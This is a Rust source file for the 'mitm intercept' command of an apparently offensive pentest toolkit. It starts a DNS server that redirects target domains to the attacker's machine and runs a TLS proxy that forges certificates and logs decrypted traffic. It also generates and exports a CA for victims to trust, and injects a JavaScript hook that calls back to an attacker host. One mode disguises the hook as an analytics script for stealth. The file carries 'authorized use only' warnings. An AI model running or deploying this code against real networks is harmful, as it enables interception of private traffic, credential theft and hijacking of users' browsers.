//! MITM Attack Orchestrator - Integrated DNS hijacking + TLS interception
//!
//! Provides a single command to start the full MITM attack flow:
//! 1. DNS server with hijacking rules
//! 2. MITM TLS proxy for traffic interception
//!
//! ⚠️ AUTHORIZED USE ONLY - For penetration testing with explicit permission

use crate::cli::commands::{print_help, Command, Flag, Route};
use crate::cli::{output::Output, validator::Validator, CliContext};
use crate::crypto::certs::ca::{CertificateAuthority, KeyAlgorithm};
use crate::modules::dns::server::{DnsRule, DnsServer, DnsServerConfig};
use crate::modules::proxy::mitm::{HookMode, LogFormat, MitmConfig, MitmProxy};
use crate::modules::proxy::shell::MitmShell;
use std::net::{IpAddr, SocketAddr};
use std::path::{Path, PathBuf};
use std::thread;
use std::time::Duration;

pub struct MitmCommand;

impl Command for MitmCommand {
    fn domain(&self) -> &str {
        "mitm"
    }

    fn resource(&self) -> &str {
        "intercept"
    }

    fn description(&self) -> &str {
        "Man-in-the-Middle attack toolkit: DNS hijacking + TLS interception (AUTHORIZED USE ONLY)"
    }

    fn routes(&self) -> Vec<Route> {
        vec![
            Route {
                verb: "start",
                summary: "Start full MITM stack (DNS hijacking + TLS proxy)",
                usage: "rb mitm intercept start --target DOMAIN --proxy-ip IP [FLAGS]",
            },
            Route {
                verb: "proxy",
                summary: "Start only TLS interception proxy (for browser testing)",
                usage: "rb mitm intercept proxy [--port PORT] [--ca-cert FILE]",
            },
            Route {
                verb: "dns",
                summary: "Start only DNS hijacking server",
                usage: "rb mitm intercept dns --target DOMAIN --hijack-ip IP",
            },
            Route {
                verb: "generate-ca",
                summary: "Generate CA certificate for MITM interception",
                usage: "rb mitm intercept generate-ca [--output DIR]",
            },
            Route {
                verb: "export-ca",
                summary: "Export CA certificate for target installation",
                usage: "rb mitm intercept export-ca --ca-cert FILE [--format pem|der]",
            },
            Route {
                verb: "shell",
                summary: "Interactive TUI shell with request/response viewer (k9s-style)",
                usage: "rb mitm intercept shell [--port PORT] [--ca-cert FILE]",
            },
        ]
    }

    fn flags(&self) -> Vec<Flag> {
        vec![
            // Target configuration
            Flag::new("target", "Target domain pattern (e.g., *.example.com)").with_short('t'),
            Flag::new(
                "proxy-ip",
                "IP address to redirect traffic to (usually your machine)",
            )
            .with_short('i'),
            Flag::new("hijack-ip", "Alias for --proxy-ip"),
            // DNS server settings
            Flag::new("dns-bind", "DNS server bind address").with_default("0.0.0.0:53"),
            Flag::new("upstream", "Upstream DNS server")
                .with_short('u')
                .with_default("8.8.8.8"),
            Flag::new("upstream-fallback", "Fallback upstream DNS").with_default("1.1.1.1"),
            // Proxy settings
            Flag::new("proxy-port", "MITM proxy listen port")
                .with_short('p')
                .with_default("8080"),
            Flag::new("proxy-bind", "MITM proxy bind address").with_default("0.0.0.0"),
            // CA settings
            Flag::new("ca-cert", "Path to CA certificate PEM").with_short('c'),
            Flag::new("ca-key", "Path to CA private key PEM").with_short('k'),
            // Output settings
            Flag::new("output", "Output directory for generated files")
                .with_short('o')
                .with_default("."),
            Flag::new("format", "Output format for export-ca (pem or der)")
                .with_short('f')
                .with_default("pem"),
            Flag::new("log", "Enable traffic logging to stdout").with_short('l'),
            Flag::new("log-file", "Log traffic to file (e.g., traffic.log)"),
            Flag::new("log-format", "Log format: text or json").with_default("text"),
            Flag::new("verbose", "Verbose output").with_short('v'),
            Flag::new(
                "hook",
                "Inject JS hook URL (external mode, e.g. http://rbb:3000/hook.js)",
            )
            .with_short('H'),
            Flag::new(
                "hook-path",
                "Same-origin hook path (e.g. /assets/js/rb.js) - served by MITM",
            ),
            Flag::new(
                "hook-callback",
                "RBB callback URL for same-origin mode (e.g. http://10.0.0.1:3000)",
            ),
        ]
    }

    fn examples(&self) -> Vec<(&str, &str)> {
        vec![
            (
                "Full MITM attack on target.com",
                "rb mitm intercept start --target *.target.com --proxy-ip 10.0.0.5",
            ),
            (
                "With custom ports",
                "rb mitm intercept start --target *.target.com --proxy-ip 10.0.0.5 --dns-bind 0.0.0.0:5353 --proxy-port 8443",
            ),
            (
                "TLS proxy only (browser testing)",
                "rb mitm intercept proxy --proxy-port 8080",
            ),
            (
                "DNS hijacking only",
                "rb mitm intercept dns --target *.target.com --hijack-ip 10.0.0.5",
            ),
            (
                "Generate CA certificate",
                "rb mitm intercept generate-ca --output ./certs",
            ),
            (
                "Export CA as DER for Windows",
                "rb mitm intercept export-ca --ca-cert ca.pem --format der",
            ),
            (
                "Log traffic to file",
                "rb mitm intercept proxy --log-file traffic.log",
            ),
            (
                "Log as JSON for parsing",
                "rb mitm intercept proxy --log-file traffic.json --log-format json",
            ),
            (
                "Log to stdout AND file",
                "rb mitm intercept proxy --log --log-file traffic.log",
            ),
            (
                "Interactive shell mode",
                "rb mitm intercept shell --proxy-port 8080",
            ),
            (
                "Same-origin hook injection (stealthier)",
                "rb mitm intercept start -t *.target.com -i 10.0.0.5 --hook-path /assets/js/analytics.js --hook-callback http://10.0.0.5:3000",
            ),
        ]
    }

    fn execute(&self, ctx: &CliContext) -> Result<(), String> {
        let verb = ctx.verb.as_ref().ok_or_else(|| {
            print_help(self);
            "No verb provided".to_string()
        })?;

        match verb.as_str() {
            "start" => self.start_full_mitm(ctx),
            "dns" => self.start_dns_only(ctx),
            "proxy" => self.start_proxy_only(ctx),
            "shell" => self.start_shell(ctx),
            "generate-ca" => self.generate_ca(ctx),
            "export-ca" => self.export_ca(ctx),
            _ => {
                Output::error(&format!("Unknown verb: {}", verb));
                println!(
                    "{}",
                    Validator::suggest_command(
                        verb,
                        &["start", "dns", "proxy", "shell", "generate-ca", "export-ca"]
                    )
                );
                Err("Invalid verb".to_string())
            }
        }
    }
}

impl MitmCommand {
    /// Start full MITM stack: DNS hijacking + TLS proxy
    fn start_full_mitm(&self, ctx: &CliContext) -> Result<(), String> {
        Output::header("MITM Attack Stack");
        Output::warning("⚠️  AUTHORIZED USE ONLY - Ensure you have explicit permission!");
        println!();

        // Required parameters
        let target = ctx
            .get_flag("target")
            .ok_or("Missing required --target flag (e.g., *.target.com)")?;
        let proxy_ip_str = ctx
            .get_flag("proxy-ip")
            .or_else(|| ctx.get_flag("hijack-ip"))
            .ok_or("Missing required --proxy-ip flag (your machine's IP)")?;

        let proxy_ip: IpAddr = proxy_ip_str
            .parse()
            .map_err(|_| format!("Invalid proxy IP: {}", proxy_ip_str))?;

        // DNS server settings
        let dns_bind = ctx.get_flag_or("dns-bind", "0.0.0.0:53");
        let upstream_primary = ctx.get_flag_or("upstream", "8.8.8.8");
        let _upstream_fallback = ctx.get_flag_or("upstream-fallback", "1.1.1.1");

        // Proxy settings
        let proxy_bind = ctx.get_flag_or("proxy-bind", "0.0.0.0");
        let proxy_port: u16 = ctx
            .get_flag_or("proxy-port", "8080")
            .parse()
            .map_err(|_| "Invalid proxy port")?;

        let proxy_addr: SocketAddr = format!("{}:{}", proxy_bind, proxy_port)
            .parse()
            .map_err(|e| format!("Invalid proxy address: {}", e))?;

        // Get or generate CA
        let ca = self.get_or_generate_ca(ctx)?;

        // Parse logging options
        let log_stdout = ctx.get_flag("log").is_some() || ctx.get_flag("verbose").is_some();
        let log_file = ctx.get_flag("log-file").map(PathBuf::from);
        let log_format = LogFormat::from_str(&ctx.get_flag_or("log-format", "text"));

        // Print configuration
        Output::subheader("Configuration");
        Output::item("Target Pattern", &target);
        Output::item("Hijack IP", &proxy_ip.to_string());
        Output::item("DNS Server", &dns_bind);
        Output::item("MITM Proxy", &proxy_addr.to_string());
        Output::item("Upstream DNS", &upstream_primary);
        Output::item("CA Subject", &ca.subject());
        if log_stdout || log_file.is_some() {
            Output::item(
                "Logging",
                &format!(
                    "stdout={}, file={}, format={:?}",
                    log_stdout,
                    log_file
                        .as_ref()
                        .map(|p| p.display().to_string())
                        .unwrap_or_else(|| "none".to_string()),
                    log_format
                ),
            );
        }
        println!();

        // Print attack flow
        Output::subheader("Attack Flow");
        println!("  1. Target DNS query: {} → Our DNS server", target);
        println!("  2. DNS response: {} → {}", target, proxy_ip);
        println!("  3. Target connects to {}:{} (HTTPS)", proxy_ip, 443);
        println!("  4. MITM proxy generates fake certificate");
        println!("  5. Traffic intercepted and decrypted");
        println!();

        // Create DNS server configuration
        let dns_config = DnsServerConfig::default()
            .with_bind(&dns_bind)
            .with_upstream(&upstream_primary)
            .with_logging(log_stdout);

        // Create DNS server with hijacking rule
        let mut dns_server = DnsServer::new(dns_config);

        // Add hijacking rule for target domain
        dns_server.add_rule(DnsRule::override_a(&target, &proxy_ip.to_string()));

        let mut proxy_config = MitmConfig::new(proxy_addr, ca)
            .with_timeout(Duration::from_secs(30))
            .with_logger(log_stdout, log_file, log_format);

        // Configure hook injection mode
        proxy_config = self.configure_hook_mode(ctx, proxy_config)?;

        // Start services
        Output::success("Starting MITM attack stack...");
        println!();

        // Start DNS server in background thread
        let dns_handle = thread::spawn(move || {
            if let Err(e) = dns_server.run() {
                eprintln!("\x1b[31m[DNS ERROR]\x1b[0m {}", e);
            }
        });

        Output::info(&format!("DNS server started on {}", dns_bind));

        // Small delay to ensure DNS is ready
        thread::sleep(Duration::from_millis(100));

        // Start MITM proxy in main thread
        Output::info(&format!("MITM proxy starting on {}", proxy_addr));
        println!();

        Output::subheader("Instructions for Target");
        println!(
            "  1. Configure target to use DNS server: {}",
            dns_bind.split(':').next().unwrap_or("0.0.0.0")
        );
        println!("  2. Or modify /etc/hosts, ARP spoof, or rogue DHCP");
        println!("  3. Import CA certificate to target's trust store");
        println!();

        Output::info("Press Ctrl+C to stop...");
        println!();

        // Run proxy (blocking)
        let proxy = MitmProxy::new(proxy_config);
        proxy.run().map_err(|e| format!("Proxy error: {}", e))?;

        // Wait for DNS thread (won't normally reach here)
        let _ = dns_handle.join();

        Ok(())
    }

    /// Start only DNS hijacking server
    fn start_dns_only(&self, ctx: &CliContext) -> Result<(), String> {
        Output::header("DNS Hijacking Server");
        Output::warning("⚠️  AUTHORIZED USE ONLY");
        println!();

        let target = ctx
            .get_flag("target")
            .ok_or("Missing required --target flag")?;

        // Allow --hijack-ip or --proxy-ip for convenience
        let hijack_ip_str = ctx
            .get_flag("hijack-ip")
            .or_else(|| ctx.get_flag("proxy-ip"))
            .ok_or("Missing --hijack-ip flag")?;

        let hijack_ip: IpAddr = hijack_ip_str
            .parse()
            .map_err(|_| format!("Invalid IP: {}", hijack_ip_str))?;

        let dns_bind = ctx.get_flag_or("dns-bind", "0.0.0.0:53");
        let upstream = ctx.get_flag_or("upstream", "8.8.8.8");

        Output::item("Bind Address", &dns_bind);
        Output::item("Target Pattern", &target);
        Output::item("Hijack IP", &hijack_ip.to_string());
        Output::item("Upstream DNS", &upstream);
        println!();

        // Create DNS server configuration
        let config = DnsServerConfig::default()
            .with_bind(&dns_bind)
            .with_upstream(&upstream)
            .with_logging(true);

        let mut server = DnsServer::new(config);

        // Add hijacking rule
        server.add_rule(DnsRule::override_a(&target, &hijack_ip.to_string()));

        Output::success(&format!("DNS hijacking server started on {}", dns_bind));
        Output::info("Press Ctrl+C to stop...");
        println!();

        server.run()
    }

    /// Start only MITM proxy
    fn start_proxy_only(&self, ctx: &CliContext) -> Result<(), String> {
        Output::header("MITM TLS Proxy");
        Output::warning("⚠️  AUTHORIZED USE ONLY");
        println!();

        let bind = ctx.get_flag_or("proxy-bind", "127.0.0.1");
        let port: u16 = ctx
            .get_flag_or("proxy-port", "8080")
            .parse()
            .map_err(|_| "Invalid port")?;

        let addr: SocketAddr = format!("{}:{}", bind, port)
            .parse()
            .map_err(|e| format!("Invalid address: {}", e))?;

        let ca = self.get_or_generate_ca(ctx)?;

        // Parse logging options
        let log_stdout = ctx.get_flag("log").is_some() || ctx.get_flag("verbose").is_some();
        let log_file = ctx.get_flag("log-file").map(PathBuf::from);
        let log_format = LogFormat::from_str(&ctx.get_flag_or("log-format", "text"));

        Output::item("Listen Address", &addr.to_string());
        Output::item("CA Subject", &ca.subject());
        if log_stdout || log_file.is_some() {
            Output::item(
                "Logging",
                &format!(
                    "stdout={}, file={}, format={:?}",
                    log_stdout,
                    log_file
                        .as_ref()
                        .map(|p| p.display().to_string())
                        .unwrap_or_else(|| "none".to_string()),
                    log_format
                ),
            );
        }
        println!();

        Output::success(&format!("MITM proxy starting on {}", addr));
        Output::info("Configure browser to use this as HTTP proxy");
        println!();

        let mut config = MitmConfig::new(addr, ca)
            .with_timeout(Duration::from_secs(30))
            .with_logger(log_stdout, log_file, log_format);

        // Configure hook injection mode
        config = self.configure_hook_mode(ctx, config)?;

        let proxy = MitmProxy::new(config);
        proxy.run().map_err(|e| format!("Proxy error: {}", e))
    }

    /// Start interactive shell mode
    fn start_shell(&self, ctx: &CliContext) -> Result<(), String> {
        let bind = ctx.get_flag_or("proxy-bind", "127.0.0.1");
        let port: u16 = ctx
            .get_flag_or("proxy-port", "8080")
            .parse()
            .map_err(|_| "Invalid port")?;

        let addr: SocketAddr = format!("{}:{}", bind, port)
            .parse()
            .map_err(|e| format!("Invalid address: {}", e))?;

        let ca = self.get_or_generate_ca(ctx)?;

        // Create and run the interactive shell
        let shell =
            MitmShell::new(addr).map_err(|e| format!("Failed to initialize shell: {}", e))?;

        shell
            .run_with_proxy(ca)
            .map_err(|e| format!("Shell error: {}", e))
    }

    /// Generate CA certificate
    fn generate_ca(&self, ctx: &CliContext) -> Result<(), String> {
        let format = ctx.get_flag("format").unwrap_or_else(|| "text".to_string());
        let is_json = format == "json";

        let output_dir = ctx.get_flag_or("output", ".");
        let output_path = Path::new(&output_dir);

        if !output_path.exists() {
            std::fs::create_dir_all(output_path)
                .map_err(|e| format!("Failed to create directory: {}", e))?;
        }

        if !is_json {
            Output::header("Generate MITM CA Certificate");
            Output::spinner_start("Generating CA certificate...");
        }

        let ca = CertificateAuthority::new(
            "CN=redblue MITM CA, O=redblue Security, C=XX",
            KeyAlgorithm::EcdsaP256,
            3650, // 10 years
        )
        .map_err(|e| format!("Failed to generate CA: {}", e))?;

        if !is_json {
            Output::spinner_done();
        }

        // Save CA certificate
        let cert_path = output_path.join("mitm-ca.pem");
        std::fs::write(&cert_path, ca.export_ca_pem())
            .map_err(|e| format!("Failed to write certificate: {}", e))?;

        // Save CA private key
        let key_path = output_path.join("mitm-ca-key.pem");
        std::fs::write(&key_path, ca.export_key_pem())
            .map_err(|e| format!("Failed to write key: {}", e))?;

        if is_json {
            println!("{{");
            println!(
                "  \"certificate_path\": \"{}\",",
                cert_path
                    .display()
                    .to_string()
                    .replace('\\', "\\\\")
                    .replace('"', "\\\"")
            );
            println!(
                "  \"key_path\": \"{}\",",
                key_path
                    .display()
                    .to_string()
                    .replace('\\', "\\\\")
                    .replace('"', "\\\"")
            );
            println!("  \"subject\": \"{}\",", ca.subject().replace('"', "\\\""));
            println!("  \"fingerprint\": \"{}\"", ca.fingerprint());
            println!("}}");
            return Ok(());
        }

        Output::success("CA certificate generated!");
        println!();
        Output::item("Certificate", &cert_path.display().to_string());
        Output::item("Private Key", &key_path.display().to_string());
        Output::item("Subject", &ca.subject());
        Output::item("Fingerprint", &ca.fingerprint());
        println!();

        Output::info("Install mitm-ca.pem in target's trust store to avoid warnings");

        Ok(())
    }

    /// Export CA certificate for target installation
    fn export_ca(&self, ctx: &CliContext) -> Result<(), String> {
        let output_format = ctx.get_flag("format").unwrap_or_else(|| "text".to_string());
        let is_json = output_format == "json";

        let ca_cert_path = ctx
            .get_flag("ca-cert")
            .ok_or("Missing --ca-cert flag (path to CA certificate)")?;

        // format flag is overloaded - use pem/der for export format, json for output format
        // If format is "json", default to pem export; otherwise use the specified format
        let export_format = if is_json {
            "pem".to_string()
        } else {
            output_format.clone()
        };

        // Read the CA certificate
        let cert_pem = std::fs::read_to_string(&ca_cert_path)
            .map_err(|e| format!("Failed to read CA cert: {}", e))?;

        // Parse it to get info
        use crate::crypto::certs::x509::Certificate;
        let cert = Certificate::from_pem(&cert_pem)
            .map_err(|e| format!("Failed to parse certificate: {}", e))?;

        let subject = cert.subject_cn().unwrap_or("Unknown");
        let fingerprint = cert.fingerprint_sha256();

        let output_path = match export_format.as_str() {
            "pem" => {
                let output_path = ctx.get_flag_or("output", "mitm-ca-export.pem");
                std::fs::write(&output_path, &cert_pem)
                    .map_err(|e| format!("Failed to write: {}", e))?;
                output_path
            }
            "der" => {
                let output_path = ctx.get_flag_or("output", "mitm-ca-export.der");
                let der_bytes = cert.to_der();
                std::fs::write(&output_path, &der_bytes)
                    .map_err(|e| format!("Failed to write: {}", e))?;
                output_path
            }
            _ => {
                // For json format, skip write and just output info
                if !is_json {
                    return Err(format!(
                        "Unknown format: {}. Use 'pem', 'der', or 'json'",
                        export_format
                    ));
                }
                String::new()
            }
        };

        if is_json {
            println!("{{");
            println!(
                "  \"source\": \"{}\",",
                ca_cert_path.replace('\\', "\\\\").replace('"', "\\\"")
            );
            println!("  \"subject\": \"{}\",", subject.replace('"', "\\\""));
            println!("  \"fingerprint\": \"{}\",", fingerprint);
            if !output_path.is_empty() {
                println!(
                    "  \"exported_to\": \"{}\",",
                    output_path.replace('\\', "\\\\").replace('"', "\\\"")
                );
            }
            println!("  \"export_format\": \"{}\"", export_format);
            println!("}}");
            return Ok(());
        }

        Output::header("Export CA Certificate");
        Output::item("Source", &ca_cert_path);
        Output::item("Subject", subject);
        Output::item("Fingerprint", &fingerprint);
        println!();
        Output::success(&format!(
            "Exported {} to: {}",
            export_format.to_uppercase(),
            output_path
        ));

        println!();
        Output::info("Installation instructions:");
        println!("  • Windows: Double-click .der file → Install → Trusted Root CAs");
        println!("  • macOS: Keychain Access → System → Import → Trust Always");
        println!("  • Linux: Copy to /usr/local/share/ca-certificates/ → update-ca-certificates");
        println!("  • Firefox: Settings → Privacy → View Certificates → Import");
        println!("  • Chrome: Uses system trust store");

        Ok(())
    }

    /// Get or generate CA certificate
    fn get_or_generate_ca(&self, ctx: &CliContext) -> Result<CertificateAuthority, String> {
        if let Some(ca_cert_path) = ctx.get_flag("ca-cert") {
            let ca_key_path = ctx
                .get_flag("ca-key")
                .ok_or("When using --ca-cert, must also provide --ca-key")?;

            let cert_pem = std::fs::read_to_string(&ca_cert_path)
                .map_err(|e| format!("Failed to read CA cert: {}", e))?;
            let key_pem = std::fs::read_to_string(&ca_key_path)
                .map_err(|e| format!("Failed to read CA key: {}", e))?;

            CertificateAuthority::from_pem(&cert_pem, &key_pem)
                .map_err(|e| format!("Failed to load CA: {}", e))
        } else {
            Output::info("No CA provided, generating temporary CA...");
            CertificateAuthority::new(
                "CN=redblue MITM CA, O=redblue Security, C=XX",
                KeyAlgorithm::EcdsaP256,
                365,
            )
            .map_err(|e| format!("Failed to generate CA: {}", e))
        }
    }

    /// Configure hook injection mode based on CLI flags
    ///
    /// Supports two modes:
    /// 1. External: --hook URL (e.g., http://attacker:3000/hook.js)
    /// 2. Same-origin: --hook-path + --hook-callback (hook served from victim's domain)
    fn configure_hook_mode(
        &self,
        ctx: &CliContext,
        mut config: MitmConfig,
    ) -> Result<MitmConfig, String> {
        let hook_path = ctx.get_flag("hook-path");
        let hook_callback = ctx.get_flag("hook-callback");
        let hook_external = ctx.get_flag("hook");

        // Check for conflicting options
        if hook_external.is_some() && (hook_path.is_some() || hook_callback.is_some()) {
            return Err(
                "Cannot use --hook with --hook-path/--hook-callback. Choose one mode.".to_string(),
            );
        }

        // Same-origin mode (stealthier - no CORS, same domain)
        if let Some(path) = hook_path {
            let callback = hook_callback.ok_or(
                "--hook-callback is required when using --hook-path (e.g., http://10.0.0.1:3000)",
            )?;

            // Ensure path starts with /
            let path = if path.starts_with('/') {
                path
            } else {
                format!("/{}", path)
            };

            Output::subheader("Hook Injection (Same-Origin Mode)");
            Output::item("Hook Path", &path);
            Output::item("RBB Callback", &callback);
            Output::info("Hook will be served directly by MITM proxy from victim's domain");
            println!();

            config = config.with_hook_mode(HookMode::SameOrigin {
                path,
                callback_url: callback,
            });
        }
        // External mode (traditional - requires CORS)
        else if let Some(url) = hook_external {
            Output::subheader("Hook Injection (External Mode)");
            Output::item("Hook URL", &url);
            Output::warning("External hook requires CORS headers on RBB server");
            println!();

            config = config.with_hook_mode(HookMode::External(url));
        }

        Ok(config)
    }
}
